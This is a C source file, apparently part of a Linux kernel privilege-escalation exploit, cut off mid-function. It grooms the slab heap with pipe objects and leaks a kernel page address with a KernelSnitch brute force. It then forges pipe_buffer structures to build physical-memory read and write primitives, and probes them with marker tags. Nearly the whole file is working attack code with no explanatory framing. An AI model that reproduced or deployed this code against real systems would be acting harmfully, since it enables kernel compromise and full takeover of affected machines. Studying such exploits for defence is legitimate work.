#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#ifndef PIPE_SHAPE_ROUNDS
#define PIPE_SHAPE_ROUNDS 0
#endif
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;
static int p0_readback_fds[PIPE_RECLAIM][2];
static int p0_readback_fds_initialized;
static size_t p0_pipe_marker_size = PAGE_SIZE;

static int p0_read_fd(size_t index) {
  return p0_readback_fds_initialized && p0_readback_fds[index][0] >= 0
      ? p0_readback_fds[index][0] : pipe_fds_reclaim[index][0];
}

static int p0_write_fd(size_t index) {
  return p0_readback_fds_initialized && p0_readback_fds[index][1] >= 0
      ? p0_readback_fds[index][1] : pipe_fds_reclaim[index][1];
}

static void close_p0_readback_fds(void) {
  if (!p0_readback_fds_initialized) return;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_readback_fds[i][0] >= 0) close(p0_readback_fds[i][0]);
    if (p0_readback_fds[i][1] >= 0) close(p0_readback_fds[i][1]);
    p0_readback_fds[i][0] = -1;
    p0_readback_fds[i][1] = -1;
  }
  p0_readback_fds_initialized = 0;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static void close_p0_gate_holders(void) {
  if (!p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_gate_holders[i][0] >= 0) {
      close(p0_gate_holders[i][0]);
    }
    if (p0_gate_holders[i][1] >= 0) {
      close(p0_gate_holders[i][1]);
    }
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  p0_gate_holders_initialized = 0;
}
#endif
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
int pipebuf_dense_forge;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
int pipe_wo_read_full;
int pipe_wo_read_partial;
int pipe_wo_read_eagain;
int pipe_wo_read_other;
int pipe_wo_first_n;
int pipe_wo_first_errno;
uint64_t pipe_wo_first_q0;
uint64_t pipe_wo_first_q1;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

static int pipe_env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }
  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  int ret = fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE);
#if defined(PIPE_RESIZE_BEST_EFFORT) && PIPE_RESIZE_BEST_EFFORT
  static int resize_fail_logged;
  if (ret < 0 && !resize_fail_logged) {
    resize_fail_logged = 1;
    pr_warning("pipe resize best-effort slots=%zu errno=%d\n", slots, errno);
  }
#else
  SYSCHK(ret);
#endif
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  size_t reclaim_grown = 0;
  size_t reclaim_short = 0;
  int reclaim_min_size = INT_MAX;
  int reclaim_max_size = 0;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    int size = fcntl(pipe_fds_reclaim[i][0], F_GETPIPE_SZ);
    if (size == (int)(PIPE_BUFFER_SLOTS * PAGE_SIZE)) {
      reclaim_grown++;
    } else {
      reclaim_short++;
    }
    if (size >= 0 && size < reclaim_min_size) reclaim_min_size = size;
    if (size > reclaim_max_size) reclaim_max_size = size;
  }
  pr_info("pipe reclaim sizes grown=%zu short=%zu total=%d min=%d max=%d "
          "expected=%d slabs=%d\n",
          reclaim_grown, reclaim_short, PIPE_RECLAIM,
          reclaim_min_size == INT_MAX ? -1 : reclaim_min_size,
          reclaim_max_size, PIPE_BUFFER_SLOTS * PAGE_SIZE,
          PIPE_RECLAIM_SLABS);

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  return base;
}

void reset_pipe_attempt(void) {
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  close_p0_readback_fds();
#endif
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipebuf_dense_forge = 0;
  pipe_wo_read_full = 0;
  pipe_wo_read_partial = 0;
  pipe_wo_read_eagain = 0;
  pipe_wo_read_other = 0;
  pipe_wo_first_n = 0;
  pipe_wo_first_errno = 0;
  pipe_wo_first_q0 = 0;
  pipe_wo_first_q1 = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

void forge_pipe_buffers_dense_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);

static void set_reclaim_read_nonblock(void) {
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    int flags = fcntl(pipe_fds_reclaim[i][0], F_GETFL, 0);
    if (flags >= 0) {
      fcntl(pipe_fds_reclaim[i][0], F_SETFL, flags | O_NONBLOCK);
    }
  }
}

static void drain_reclaim_pipes(void) {
  char drain[128];
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    for (;;) {
      errno = 0;
      ssize_t n = read(pipe_fds_reclaim[i][0], drain, sizeof(drain));
      if (n > 0) {
        continue;
      }
      break;
    }
  }
}

static int fill_reclaim_markers(size_t len) {
  char marker[64];
  if (len > sizeof(marker)) {
    return 0;
  }
  memset(marker, 0x61, len);
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    ssize_t n = write(pipe_fds_reclaim[i][1], marker, len);
    if (n != (ssize_t)len) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer_write_only(int fd, uintptr_t base) {
  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  char seed[] = PHYS_READ_TAG;
  pipe_wo_read_full = 0;
  pipe_wo_read_partial = 0;
  pipe_wo_read_eagain = 0;
  pipe_wo_read_other = 0;
  pipe_wo_first_n = 0;
  pipe_wo_first_errno = 0;
  pipe_wo_first_q0 = 0;
  pipe_wo_first_q1 = 0;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  set_reclaim_read_nonblock();
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipebuf_dense_forge = 0;

  for (size_t page_index = 0; page_index < PIPE_CANDIDATE_PAGES; page_index++) {
    uintptr_t candidate = base + page_index * PAGE_SIZE;
    int cand_full = 0;
    int cand_partial = 0;
    int cand_eagain = 0;
    int cand_other = 0;
    int cand_first_n = 0;
    int cand_first_errno = 0;
    uint64_t cand_first_q0 = 0;
    uint64_t cand_first_q1 = 0;

    drain_reclaim_pipes();
    if (!fill_reclaim_markers(sizeof(seed))) {
      pipe_wo_read_other++;
      pr_info("phys step write-only refill failed candidate=%zu base=%016zx "
              "errno=%d\n",
              page_index, candidate, errno);
      continue;
    }

    forge_pipe_buffers_dense_on_page(fd, candidate, proof_addr, sizeof(seed), 0);
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      char got[sizeof(seed)];
      memset(got, 0, sizeof(got));
      errno = 0;
      ssize_t n = read(pipe_fds_reclaim[i][0], got, sizeof(got));
      if (cand_first_n == 0 && n != -1) {
        cand_first_n = (int)n;
        cand_first_errno = errno;
        memcpy(&cand_first_q0, got, sizeof(cand_first_q0));
        memcpy(&cand_first_q1, got + sizeof(cand_first_q0),
               sizeof(cand_first_q1));
      }
      if (pipe_wo_first_n == 0 && n != -1) {
        pipe_wo_first_n = (int)n;
        pipe_wo_first_errno = errno;
        memcpy(&pipe_wo_first_q0, got, sizeof(pipe_wo_first_q0));
        memcpy(&pipe_wo_first_q1, got + sizeof(pipe_wo_first_q0),
               sizeof(pipe_wo_first_q1));
      }
      if (n == (ssize_t)sizeof(seed)) {
        cand_full++;
        pipe_wo_read_full++;
      } else if (n > 0) {
        cand_partial++;
        pipe_wo_read_partial++;
      } else if (n < 0 && errno == EAGAIN) {
        cand_eagain++;
        pipe_wo_read_eagain++;
        if (cand_first_n == 0) {
          cand_first_n = -1;
          cand_first_errno = errno;
        }
        if (pipe_wo_first_n == 0) {
          pipe_wo_first_n = -1;
          pipe_wo_first_errno = errno;
        }
      } else {
        cand_other++;
        pipe_wo_read_other++;
        if (cand_first_n == 0) {
          cand_first_n = (int)n;
          cand_first_errno = errno;
        }
        if (pipe_wo_first_n == 0) {
          pipe_wo_first_n = (int)n;
          pipe_wo_first_errno = errno;
        }
      }
      if (n == (ssize_t)sizeof(seed) && memcmp(got, seed, sizeof(seed)) == 0) {
        pipebuf_page_base = candidate;
        pipebuf_pipe_idx = (int)i;
        pipe_probe_found = 1;
        pipe_probe_page = direct_to_page(proof_addr);
        pipe_probe_ops = pipe_buf_ops_addr();
        pipe_probe_len = sizeof(seed) + 1;
        pipe_probe_flags = PIPE_BUF_FLAG_CAN_MERGE;
        pipebuf_dense_forge = 1;
        pr_info("phys step write-only pipe idx=%d candidate=%zu base=%016zx\n",
                pipebuf_pipe_idx, page_index, candidate);
        return 1;
      }
    }
    pr_info("phys step write-only candidate=%zu base=%016zx full=%d "
            "partial=%d eagain=%d other=%d first_n=%d first_errno=%d "
            "first=%016zx/%016zx\n",
            page_index, candidate, cand_full, cand_partial, cand_eagain,
            cand_other, cand_first_n, cand_first_errno, cand_first_q0,
            cand_first_q1);
  }
  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

void forge_pipe_buffers_dense_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off + sizeof(pb) <= PAGE_SIZE; off += 8) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
